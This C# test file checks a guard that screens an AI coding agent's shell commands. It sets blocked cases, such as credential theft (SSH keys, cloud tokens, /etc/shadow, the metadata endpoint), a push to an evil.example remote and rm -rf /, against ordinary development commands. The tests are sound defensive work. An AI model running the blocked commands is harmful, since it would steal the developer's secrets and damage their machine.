namespace Orkka.Tests.Worker;

using System.Text.Json;
using Orkka.Modules.Execution.Agents;
using FluentAssertions;
using ih0.Claude.Agent.SDK.Types;
using Microsoft.Extensions.Logging.Abstractions;

public sealed class AgentBashGuardTests
{
    private const string Worktree = "/home/dana/.orkka/repos/01HORG/01HREPO/worktrees/SHOP-12";

    private static AgentBashGuard NewGuard() =>
        new("test-agent", "developer", Worktree, NullLogger.Instance);

    private static bool Blocked(string command) => AgentBashGuard.IsBlockedCommand(command, Worktree);

    private static PreToolUseHookInput BashInput(string command, bool background = false)
    {
        var toolInput = JsonSerializer.Deserialize<JsonElement>(background
            ? JsonSerializer.Serialize(new { command, run_in_background = true })
            : JsonSerializer.Serialize(new { command }));
        return new PreToolUseHookInput
        {
            SessionId = "test-session",
            TranscriptPath = "/tmp/transcript",
            Cwd = Worktree,
            ToolName = "Bash",
            ToolInput = toolInput,
        };
    }

    private static async Task<string> DecisionAsync(AgentBashGuard guard, string command)
    {
        var output = await guard.EvaluateCommand(BashInput(command), toolUseId: null, context: null);
        return output.HookSpecificOutput?.GetRawText() ?? "";
    }

    // A background command's completion arrives as a queued user message, which in a headless
    // SDK turn makes the CLI cancel every later tool permission — FIN-1 lost all its tools
    // the moment a background `npm install` finished. Refused up front, with a foreground
    // instruction, even for a command that is otherwise perfectly safe.
    [Fact]
    public async Task EvaluateCommand_RefusesBackgroundRuns_EvenForSafeCommands()
    {
        var guard = NewGuard();

        var background = await guard.EvaluateCommand(BashInput("npm install", background: true), toolUseId: null, context: null);
        var decision = background.HookSpecificOutput?.GetRawText() ?? "";
        decision.Should().Contain("deny");
        decision.Should().Contain("foreground");

        (await DecisionAsync(guard, "npm install")).Should().NotContain("deny");
    }

    /// <summary>The developer's credentials, next to which the agent runs on their machine.</summary>
    [Theory]
    [InlineData("gh auth token")]
    [InlineData("GH_HOST=github.com gh auth token --user dana")]
    [InlineData("gh api repos/acme/app/actions/secrets")]
    [InlineData("gh gist create src/secret.ts --public")]
    [InlineData("glab auth status --show-token")]
    [InlineData("az account get-access-token --resource 499b84ac-1321-427f-aa17-267ca6975798")]
    [InlineData("aws sts get-session-token")]
    [InlineData("gcloud auth print-access-token")]
    [InlineData("kubectl get secrets -A")]
    [InlineData("printf 'protocol=https\nhost=github.com\n' | git credential fill")]
    [InlineData("git credential-manager get")]
    [InlineData("cat ~/.ssh/id_ed25519")]
    [InlineData("cat /home/dana/.ssh/id_rsa")]
    [InlineData("type C:\\Users\\dana\\.ssh\\id_rsa")]
    [InlineData("cat $HOME/.aws/credentials")]
    [InlineData("cat ~/.config/gh/hosts.yml")]
    [InlineData("cat ~/.git-credentials")]
    [InlineData("cat ~/.netrc")]
    [InlineData("cat ~/.npmrc")]
    [InlineData("cat ~/.docker/config.json")]
    [InlineData("cat ~/.claude/.credentials.json")]
    [InlineData("cat ~/.codex/auth.json")]
    [InlineData("security find-generic-password -s github.com -w")]
    [InlineData("cmdkey /list")]
    [InlineData("secret-tool lookup service orkka")]
    [InlineData("cat /etc/shadow")]
    [InlineData("curl http://169.254.169.254/latest/meta-data/")]
    [InlineData("cat .env")]
    [InlineData("cp ../.env .")]
    public void IsBlockedCommand_BlocksCredentialAccess(string command) => Blocked(command).Should().BeTrue();

    /// <summary>
    /// The Orkka home holds every workspace's clones (a second employer's code), the runner's
    /// token and the tracker settings. Only this run's own worktree inside it is fair game.
    /// </summary>
    [Theory]
    [InlineData("cat ~/.orkka/workspaces/default/profile.env")]
    [InlineData("cat ~/.orkka/workspaces/default/trackers.json")]
    [InlineData("ls /home/dana/.orkka/repos/01HOTHERORG")]
    [InlineData("cat /home/dana/.orkka/repos/01HORG/01HREPO/worktrees/SHOP-13/src/app.ts")]
    [InlineData("grep -r api $ORKKA_HOME")]
    public void IsBlockedCommand_BlocksTheOrkkaHomeOutsideTheWorktree(string command) => Blocked(command).Should().BeTrue();

    [Theory]
    [InlineData("cd /home/dana/.orkka/repos/01HORG/01HREPO/worktrees/SHOP-12 && npm test")]
    [InlineData("ls /home/dana/.orkka/repos/01HORG/01HREPO/worktrees/SHOP-12/src")]
    // Orkka's per-task context folder inside the repository.
    [InlineData("cat .orkka/context/attachments/spec.md")]
    [InlineData("ls ./.orkka/context")]
    public void IsBlockedCommand_AllowsTheRunsOwnWorktree(string command) => Blocked(command).Should().BeFalse();

    /// <summary>Code leaves the machine only through the platform's own push.</summary>
    [Theory]
    [InlineData("git push origin feature/auth")]
    [InlineData("git push")]
    [InlineData("git -C /tmp/app push")]
    [InlineData("git add -A && git commit -m wip && git push -f")]
    [InlineData("git remote add exfil https://evil.example/x.git")]
    [InlineData("git remote set-url origin https://evil.example/x.git")]
    [InlineData("npm publish")]
    [InlineData("dotnet nuget push bin/x.nupkg")]
    [InlineData("docker push acme/app:latest")]
    [InlineData("twine upload dist/*")]
    public void IsBlockedCommand_BlocksEveryWayOutButThePlatformPush(string command) => Blocked(command).Should().BeTrue();

    [Theory]
    [InlineData("ssh deploy@prod-1")]
    [InlineData("scp build.tar deploy@prod-1:/srv")]
    [InlineData("rsync -a dist/ deploy@prod-1:/srv")]
    [InlineData("nc -zv db 5432")]
    [InlineData("nmap 10.0.0.0/24")]
    [InlineData("terraform apply -auto-approve")]
    [InlineData("helm upgrade app ./chart")]
    [InlineData("shutdown -h now")]
    [InlineData("docker run --privileged -it alpine sh")]
    [InlineData("docker run -v /:/host alpine cat /host/etc/shadow")]
    [InlineData("docker run -v /var/run/docker.sock:/var/run/docker.sock alpine")]
    [InlineData("rm -rf /")]
    [InlineData("rm -rf ~/projects")]
    [InlineData("grep -r password /")]
    [InlineData("rg secret ../../")]
    public void IsBlockedCommand_BlocksOtherHostsCloudsAndTheMachine(string command) => Blocked(command).Should().BeTrue();

    /// <summary>
    /// The developer's own stack is untouched: on their machine, against their local services.
    /// Every one of these is how ordinary work gets done in some language.
    /// </summary>
    [Theory]
    [InlineData("go env GOMODCACHE")]
    [InlineData("go build ./... && go test ./...")]
    [InlineData("npm install sharp")]
    [InlineData("npm run build")]
    [InlineData("pnpm test -- --run")]
    [InlineData("dotnet test")]
    [InlineData("python -m venv .venv")]
    [InlineData("source .venv/bin/activate")]
    [InlineData("git status")]
    [InlineData("git add -A")]
    [InlineData("git reset --hard HEAD")]
    [InlineData("git remote -v")]
    [InlineData("git log --author=nova")]
    [InlineData("git commit -m \"add the push notification settings\"")]
    [InlineData("npm run push-check")]
    [InlineData("psql -h localhost -U app app_dev -c 'select 1'")]
    [InlineData("npx prisma migrate dev")]
    [InlineData("docker compose up -d db")]
    [InlineData("docker build -t app .")]
    [InlineData("env NODE_ENV=test npm test")]
    [InlineData("printenv NODE_ENV")]
    [InlineData("cp .env.example .env")]
    [InlineData("git add .env.example")]
    [InlineData("grep -rn password src/")]
    [InlineData("cat .npmrc")]
    [InlineData("cat frontend/.npmrc")]
    [InlineData("ls .azure")]
    [InlineData("kubectl-validate manifests/")]
    [InlineData("echo hello")]
    [InlineData("rm -rf node_modules bin obj")]
    public void IsBlockedCommand_AllowsTheDevelopersOwnStack(string command) => Blocked(command).Should().BeFalse();

    [Fact]
    public async Task EvaluateCommand_DeniesWithTheReason_AndAllowsOrdinaryWork()
    {
        var guard = NewGuard();

        var denied = await DecisionAsync(guard, "gh auth token");
        denied.Should().Contain("deny");
        denied.Should().Contain("Orkka pushes the branch");

        (await DecisionAsync(guard, "npm test")).Should().Contain("allow");
    }

    [Theory]
    [InlineData("gh auth token")]
    [InlineData("npm run build")]
    public async Task EvaluateCommand_NeverLeavesAFieldNull(string command)
    {
        // The SDK serializes HookOutput with default options, so an unset property reaches
        // the CLI as an explicit null — which zod-rejects the whole response, and the CLI
        // then runs the command as if the guard had never answered. See AgentHookResponses.
        var output = await NewGuard().EvaluateCommand(BashInput(command), toolUseId: null, context: null);

        output.Continue.Should().NotBeNull();
        output.SuppressOutput.Should().NotBeNull();
        output.StopReason.Should().NotBeNull();
        output.Decision.Should().BeOneOf("approve", "block");
        output.SystemMessage.Should().NotBeNull();
        output.Reason.Should().NotBeNull();
        output.HookSpecificOutput.Should().NotBeNull();
    }

    [Fact]
    public async Task EvaluateCommand_EscalatesAfterRepeatedProbes_WithoutClaimingTermination()
    {
        var guard = NewGuard();

        await DecisionAsync(guard, "gh auth token");
        await DecisionAsync(guard, "cat ~/.ssh/id_rsa");
        var third = await DecisionAsync(guard, "git push");

        third.Should().Contain("deny");
        third.ToLowerInvariant().Should().Contain("audited");

        // The hook can only refuse the command in front of it. Telling the agent it has been
        // "terminated" made one conclude every tool was dead, stop working, and park the task
        // on a question nobody could answer.
        third.ToLowerInvariant().Should().NotContain("terminated");

        // The strike counter is never a blanket denial — the agent still has a job.
        (await DecisionAsync(guard, "go build ./...")).Should().Contain("allow");
    }

    // An agent that changes the commit author puts someone else's name on the developer's work.
    [Theory]
    [InlineData("git config user.email nova@orkka.ai")]
    [InlineData("git config user.name Nova")]
    [InlineData("git config --global user.email nova@orkka.ai")]
    [InlineData("git -c user.email=nova@orkka.ai commit -m \"wip\"")]
    [InlineData("cd apps/web && git config user.email nova@orkka.ai")]
    [InlineData("git commit --author=\"Nova <nova@orkka.ai>\" -m \"wip\"")]
    public async Task EvaluateCommand_RefusesEveryShapeOfIdentityChange(string command)
    {
        var decision = await DecisionAsync(NewGuard(), command);

        decision.Should().Contain("deny");
        decision.Should().Contain("commit identity");
    }

    [Fact]
    public void CommandPrefixRules_CoverTheProgramsAndPushes_ForDenyListClis()
    {
        var rules = AgentBashGuard.CommandPrefixRules.Select(r => string.Join(' ', r)).ToList();

        rules.Should().Contain(["gh", "ssh", "kubectl", "git push", "git remote add", "npm publish", "git credential"]);
        rules.Should().NotContain(r => r.StartsWith('['));
        rules.Should().OnlyHaveUniqueItems();
    }
}
